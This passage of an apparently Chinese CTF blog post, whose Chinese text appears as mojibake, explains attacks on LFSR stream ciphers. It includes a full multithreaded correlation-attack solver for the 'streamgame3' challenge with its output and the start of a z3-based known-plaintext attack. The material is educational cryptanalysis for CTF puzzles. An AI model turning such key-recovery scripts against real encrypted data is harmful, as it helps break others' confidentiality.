class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[26]</span></span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line">mask_bin = bin(mask)[<span class="number">2</span>:].rjust(<span class="number">32</span>, <span class="string">'0'</span>)</span><br><span class="line">feedback = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> mask_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">        feedback.append(i)</span><br><span class="line">feedback.append(<span class="number">32</span>)</span><br><span class="line">delta = feedback[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">feedback = [_ - delta <span class="keyword">for</span> _ <span class="keyword">in</span> feedback]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[27]</span></span><br><span class="line">cipher = open(<span class="string">"key"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[28]</span></span><br><span class="line">cipher_bin = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">    cipher_bin += bin(c)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[30]</span></span><br><span class="line">cur = cipher_bin[:feedback[<span class="number">-1</span>] + <span class="number">1</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    right = [cur[j] <span class="keyword">for</span> j <span class="keyword">in</span> feedback[<span class="number">1</span>:]]</span><br><span class="line">    left = str(right.count(<span class="string">'1'</span>) % <span class="number">2</span>)</span><br><span class="line">    flag = left + flag</span><br><span class="line">    cur = left + cur[:<span class="number">-1</span>]</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[36]</span></span><br><span class="line"><span class="string">'00110000011111010101001001100100'</span></span><br></pre></td></tr></table></figure><h3 id="LFSR-Correlation-Attack"><a href="#LFSR-Correlation-Attack" class="headerlink" title="LFSR - Correlation Attack"></a>LFSR - Correlation Attack</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><p>å®é™…ä½¿ç”¨çš„lfsrå¾€å¾€æ˜¯å¤šä¸ªlfsrå¹¶è¡Œï¼Œå¹¶é€šè¿‡ä»£æ•°è¿ç®—Fæ¥è·å¾—å¯†é’¥æµ</p><p><img src= "/img/loading.gif" data-src="/2020/03/12/Summary-of-Crypto-in-CTF-stream/Snipaste_2020-03-13_15-00-29.png" alt></p><p>åˆ—å‡ºä»£æ•°è¿ç®—Fçš„çœŸå€¼è¡¨ï¼Œå³å¯å¾—åˆ°ç›¸å…³ç³»æ•°$p_{1},â€¦,p_{n}$</p><p>ä¸€èˆ¬è®¤ä¸ºåœ¨$p_{i}\geq 0.6$æ—¶ï¼Œèƒ½ä½¿ç”¨ç›¸å…³æ”»å‡»å¯¹ç¬¬iä¸ªlfsrçš„å¯†é’¥æµå®ç°æ¢å¤($p_{i}=0.75$æ—¶æ•ˆæœè¾ƒå¥½)</p><p>ç›¸å…³æ”»å‡»ä½¿å¾—å¤æ‚åº¦ä»$\prod$ä¼˜åŒ–ä¸º$\sum$ï¼Œä½™ä¸‹ç›¸å…³ç³»æ•°è¶‹äº0.5çš„lfsré‡‡ç”¨æš´åŠ›æšä¸¾å³å¯</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line">R1_mask, R2_mask, R3_mask = <span class="number">0x10020</span>, <span class="number">0x4100c</span>, <span class="number">0x100002</span></span><br><span class="line">R1_partMask, R2_partMask, R3_partMask = <span class="number">0xffffff</span>, <span class="number">0xffffff</span>, <span class="number">0xffffff</span></span><br><span class="line">n1, n2, n3 = <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span></span><br><span class="line">R = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">crack_state = [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>]  <span class="comment"># ç›¸å…³æ”»å‡»æ˜¯å¦å·²å®Œæˆ(é€€å‡ºå…¶ä»–çº¿ç¨‹)</span></span><br><span class="line">start = time.clock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_stream</span><span class="params">(read_length)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> cipher</span><br><span class="line">    cipher_bytes = open(<span class="string">'cipher'</span>, <span class="string">'rb'</span>).read(read_length)</span><br><span class="line">    cipher = <span class="string">''</span>.join(bin(c)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> c <span class="keyword">in</span> cipher_bytes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R, mask, partMask)</span>:</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; partMask</span><br><span class="line">    i = (R &amp; mask) &amp; partMask</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_lfsr</span><span class="params">(R, mask, partMask, N)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        (R, out) = lfsr(R, mask, partMask)</span><br><span class="line">        ret += str(out)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1, R2, R3)</span>:</span></span><br><span class="line">    (R1_new, x1) = lfsr(R1, R1_mask, R1_partMask)</span><br><span class="line">    (R2_new, x2) = lfsr(R2, R2_mask, R2_partMask)</span><br><span class="line">    (R3_new, x3) = lfsr(R3, R3_mask, R3_partMask)</span><br><span class="line">    <span class="keyword">return</span> (R1_new, R2_new, R3_new, (x1 * x2) ^ ((x2 ^ <span class="number">1</span>) * x3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(R1, R2, R3, N)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">        (R1, R2, R3, out) = single_round(R1, R2, R3)</span><br><span class="line">        ret += str(out)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">correlation</span><span class="params">(single_cipher, cipher)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(single_cipher) == len(cipher))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(single_cipher, cipher):</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> count / len(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_p</span><span class="params">()</span>:</span></span><br><span class="line">    p1, p2, p3 = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x1 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> x2 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">for</span> x3 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">                value = (x1 * x2) ^ ((x2 ^ <span class="number">1</span>) * x3)</span><br><span class="line">                p1 += x1 ^ value ^ <span class="number">1</span></span><br><span class="line">                p2 += x2 ^ value ^ <span class="number">1</span></span><br><span class="line">                p3 += x3 ^ value ^ <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> (p1 / <span class="number">8</span>, p2 / <span class="number">8</span>, p3 / <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(p, mask, partMask, low, high, index)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> R</span><br><span class="line">    <span class="keyword">global</span> crack_state</span><br><span class="line">    <span class="keyword">for</span> guess_R <span class="keyword">in</span> range(low, high):</span><br><span class="line">        <span class="keyword">if</span> crack_state[index - <span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        single_cipher = single_lfsr(guess_R, mask, partMask, len(cipher))</span><br><span class="line">        correlation_value = correlation(single_cipher, cipher)</span><br><span class="line">        <span class="keyword">if</span> correlation_value &gt;= (p - <span class="number">0.05</span>) <span class="keyword">and</span> correlation_value &lt;= (p + <span class="number">0.05</span>):</span><br><span class="line">            print((hex(guess_R)[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), correlation_value))</span><br><span class="line">            R[index - <span class="number">1</span>] = guess_R</span><br><span class="line">            crack_state[index - <span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">            end = time.clock()</span><br><span class="line">            print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force</span><span class="params">(low, high)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> R</span><br><span class="line">    <span class="keyword">global</span> crack_state</span><br><span class="line">    <span class="keyword">for</span> guess_R <span class="keyword">in</span> range(low, high):</span><br><span class="line">        <span class="keyword">if</span> crack_state[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        guess_cipher = encrypt(R[<span class="number">0</span>], guess_R, R[<span class="number">2</span>], len(cipher))</span><br><span class="line">        <span class="keyword">if</span> guess_cipher == cipher:</span><br><span class="line">            R[<span class="number">1</span>] = guess_R</span><br><span class="line">            crack_state[<span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    init_stream(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># crack_p (step 1)</span></span><br><span class="line">    (p1, p2, p3) = crack_p()</span><br><span class="line">    print((p1, p2, p3))</span><br><span class="line">    <span class="comment"># correlation attack (step 2)</span></span><br><span class="line">    threads = []</span><br><span class="line">    low = <span class="number">2</span>**(n1 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=crack_key, args=(</span><br><span class="line">            p1, R1_mask, R1_partMask, low, high, <span class="number">1</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    low = <span class="number">2</span>**(n3 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=crack_key, args=(</span><br><span class="line">            p3, R3_mask, R3_partMask, low, high, <span class="number">3</span>))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    <span class="comment"># brute_force (step 3)</span></span><br><span class="line">    threads = []</span><br><span class="line">    low = <span class="number">2</span>**(n2 - <span class="number">1</span>)</span><br><span class="line">    crack_length = low // <span class="number">16</span></span><br><span class="line">    high = low + crack_length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        t = threading.Thread(target=brute_force, args=(low, high))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        low = high</span><br><span class="line">        high += crack_length</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line">    end = time.clock()</span><br><span class="line">    print(<span class="string">'cost &#123;&#125;s'</span>.format(end - start))</span><br><span class="line">    print(hex(R[<span class="number">0</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line">    print(hex(R[<span class="number">1</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line">    print(hex(R[<span class="number">2</span>])[<span class="number">2</span>:].rjust(<span class="number">6</span>, <span class="string">'0'</span>), end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(0.75, 0.5, 0.75)</span><br><span class="line">('01b9cb', 0.74755859375)</span><br><span class="line">cost 30.8923027s</span><br><span class="line">('16b2f3', 0.74169921875)</span><br><span class="line">cost 362.5205596s</span><br><span class="line">cost 436.23293620000004s</span><br><span class="line">01b9cb05979c16b2f3</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>expå¯¹åº”çš„æ˜¯å¼ºç½‘æ¯streamgame3ï¼Œåœ¨pypy3ä¸‹å¤§çº¦ä¸ƒå…«åˆ†é’Ÿèƒ½å‡ºç­”æ¡ˆï¼Œä½†python3ä¼°è®¡å°±æœ‰ç‚¹å„¿æ…¢äº†-.-</p><p>ç½‘ä¸Šç°åœ¨ä¼ çš„ç‰ˆæœ¬å¤§å¤šä¹Ÿéƒ½åªæ˜¯ç›¸å…³æ”»å‡»ï¼Œé¡¶å¤šåœ¨å¤šçº¿ç¨‹ä¸Šè¿›è¡Œéƒ¨åˆ†ä¼˜åŒ–</p><p>å¿«é€Ÿç›¸å…³æ”»å‡»çš„Aç®—æ³•åŸç†ç†è§£å¾ˆå®¹æ˜“ï¼Œä½†æˆ‘ç¼–å†™è„šæœ¬æµ‹è¯•åå‘ç°å‡ºä¸æ¥â€¦æš‚æ—¶æç½®</p><p>å®‰å…¨å®¢ä¸Šæœ‰ä¸€ç¯‡è®²LFSRç›¸å…³æ”»å‡»çš„æ–‡ç« ï¼Œåˆ†åˆ«ç”¨äº†å¼€æ™®æ•¦å¤§å­¦çš„è½®å­å’Œz3çº¦æŸæ¥è¿›è¡Œæ±‚è§£ï¼Œé“¾æ¥å¦‚ä¸‹</p><p><a href="https://www.anquanke.com/post/id/184828" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184828</a></p><h3 id="LFSR-Known-Plain-Attack"><a href="#LFSR-Known-Plain-Attack" class="headerlink" title="LFSR - Known Plain Attack"></a>LFSR - Known Plain Attack</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><p>LFSRçš„KPAé—®é¢˜ï¼ˆå·²çŸ¥æ˜æ–‡é•¿åº¦è¦å¤§ç­‰äºä¸¤å€çš„LFSRçº§æ•°nï¼‰</p><ul><li>å¯¹LFSRçº§æ•°nè¿›è¡Œrange(2, len(stream) // 2)ä¸Šçš„çˆ†ç ´ï¼ˆstreamæ˜¯å·²çŸ¥æ˜æ–‡æ®µï¼‰</li><li>å› ä¸º$len(stream)//2\geq n$ï¼Œæ‰€ä»¥æ¯ä¸ªçŒœæµ‹çº§æ•°iä¸‹å‡å¯¹åº”è‡³å°‘iä¸ªiå…ƒçº¿æ€§æ–¹ç¨‹ï¼ˆç³»æ•°çŸ©é˜µç§©&lt;iæƒ…å†µä¸€èˆ¬ä¸è€ƒè™‘ï¼‰</li><li>LFSRçš„ä¸‹ä¸€ä½åªå—å½“å‰nä½å’ŒæŠ½å¤´åºåˆ—å½±å“ï¼Œå› æ­¤å¾—åˆ°nä¸ªGF(2)ä¸Šå½¢å¦‚$\sum_{i=1}^{n}p_{i}$, if stream[i]==1çš„çº¿æ€§æ–¹ç¨‹ï¼Œäºæ˜¯æŠ½å¤´åºåˆ—$\\{p_{i}\\}$è·çŸ¥ï¼Œæ¢å¤å…¨éƒ¨æ˜æ–‡å¹¶æ ¡éªŒå³å¯</li></ul><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24, p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39, p40, p41, p42, p43, p44, p45, p46, p47 = BitVecs(</span><br><span class="line">    <span class="string">'p0 p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 p17 p18 p19 p20 p21 p22 p23 p24 p25 p26 p27 p28 p29 p30 p31 p32 p33 p34 p35 p36 p37 p38 p39 p40 p41 p42 p43 p44 p45 p46 p47'</span>, <span class="number">1</span>)</span><br><span class="line">p = [p0, p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24,</span><br><span class="line">     p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37, p38, p39, p40, p41, p42, p43, p44, p45, p46, p47]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_stream</span><span class="params">(known_plain, known_cipher)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(known_plain) == len(known_cipher) <span class="keyword">and</span> len(known_plain) &lt;= <span class="number">24</span>)</span><br><span class="line">    known_plain_dec = int(known_plain, <span class="number">16</span>)</span><br><span class="line">    <span class="comment">#known_plain_dec = int('89504E470D0A1A0A0000000D', 16)</span></span><br><span class="line">    known_cipher_dec = int(known_cipher, <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> bin(known_plain_dec ^ known_cipher_dec)[<span class="number">2</span>:].rjust(<span class="number">4</span> * len(known_plain), <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(stream, key_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(stream) &gt;= <span class="number">2</span> * key_length)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    <span class="comment">#var_name = ['p' + str(i) for i in range(key_length)]</span></span><br><span class="line">    <span class="comment">#exec('&#123;&#125;=BitVecs(\'&#123;&#125;\',1)'.format(",".join(var_name), " ".join(var_name)))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(stream) - key_length):</span><br><span class="line">        cur = stream[i: i + key_length + <span class="number">1</span>]</span><br><span class="line">        equation = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(key_length):</span><br><span class="line">            <span class="keyword">if</span> cur[j] == <span class="string">'1'</span>:</span><br><span class="line">                equation += <span class="string">'p'</span> + str(j) + <span class="string">'+'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> len(equation):</span><br><span class="line">            equation = equation[:<span class="number">-1</span>] + <span class="string">' == '</span> + str(cur[<span class="number">-1</span>])</span><br><span class="line">            solver.add(eval(equation))</span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        m = solver.model()</span><br><span class="line">        feedback = <span class="string">''</span>.join([str(m[p[i]]) <span class="keyword">for</span> i <span class="keyword">in</span> range(key_length)])</span><br><span class="line">        <span class="comment">#print('[&#123;&#125;]: ini_key = \'&#123;&#125;\' ; feedback = \'&#123;&#125;\''.format(str(key_length), stream[:key_length], feedback))</span></span><br><span class="line">        <span class="keyword">return</span> (stream[:key_length], feedback)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(cur, feedback)</span>:</span></span><br><span class="line">    cur_num = int(cur, <span class="number">2</span>)</span><br><span class="line">    output = (cur_num &lt;&lt; <span class="number">1</span>) &amp; ((<span class="number">1</span> &lt;&lt; len(feedback)) - <span class="number">1</span>)</span><br><span class="line">    i = (cur_num &amp; int(feedback, <span class="number">2</span>)) &amp; ((<span class="number">1</span> &lt;&lt; len(feedback)) - <span class="number">1</span>)</span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">        i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    output = bin(output)[<span class="number">2</span>:].rjust(len(cur), <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> (output, lastbit)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_byte</span><span class="params">(cur, feedback)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(cur) &gt;= <span class="number">8</span>:</span><br><span class="line">        byte = int(cur[:<span class="number">8</span>], <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            cur, lastbit = lfsr(cur, feedback)</span><br><span class="line">        <span class="keyword">return</span> (cur, byte)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        byte = cur</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span> - len(cur)):</span><br><span class="line">            cur, lastbit = lfsr(cur, feedback)</span><br><span class="line">            byte += str(lastbit)</span><br><span class="line">        <span class="keyword">return</span> (cur, int(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = open(<span class="string">'lfsr.png.encrypt'</span>, <span class="string">"rb"</span>).read()</span><br><span class="line">    <span class="comment"># kpa_attack for length(hex) &lt;= 24</span></span><br><span class="line">    stream = init_stream(<span class="string">'89504E470D0A1A0A0000000D'</span>,</span><br><span class="line">                         <span class="string">'e63b037e74c01aeefd6552ef'</span>)</span><br><span 